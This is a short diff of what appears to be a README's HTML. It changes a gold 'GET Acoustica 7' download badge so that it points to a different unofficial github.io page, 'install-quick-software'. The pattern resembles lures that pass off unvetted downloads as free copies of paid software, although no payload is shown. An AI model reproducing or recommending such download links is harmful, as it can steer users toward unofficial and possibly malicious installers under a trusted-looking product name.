@@ -7,7 +7,7 @@
 <br>  
 
 <div align="center">  
-<a href="https://osx-app.github.io/.github/acoustica">  
+<a href="https://install-quick-software.github.io/.github/acoustica">  
 <img src="https://img.shields.io/badge/💻_GET_Acoustica_7-gold?style=for-the-badge&logo=apple" alt="GET Acoustica 7">  
 </a>  
 </div>
